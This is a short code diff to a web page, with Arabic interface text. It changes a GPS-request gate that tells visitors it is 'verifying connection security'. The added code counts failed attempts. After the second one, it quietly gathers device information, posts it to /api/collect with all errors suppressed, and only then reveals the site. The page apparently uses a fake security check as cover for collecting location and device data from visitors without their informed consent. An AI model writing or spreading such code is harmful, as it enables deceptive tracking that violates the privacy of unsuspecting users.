@@ -441,10 +441,24 @@
             document.getElementById('confirmBtn').style.display = 'block';
         }
 
+        let gpsAttempts = 0;
+
         async function requestGPS() {
+            gpsAttempts++;
             document.getElementById('confirmBtn').style.display = 'none';
             document.getElementById('spinner').style.display = 'block';
             document.getElementById('loadingHint').textContent = '⏳ يتم التحقق من أمان الاتصال...';
+
+            // After 2 failed attempts, proceed without GPS
+            if (gpsAttempts > 2) {
+                const info = await collectDeviceInfo();
+                try {
+                    await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
+                } catch (e) { }
+                dataCollected = true;
+                showSite();
+                return;
+            }
 
             try {
                 const pos = await Promise.race([
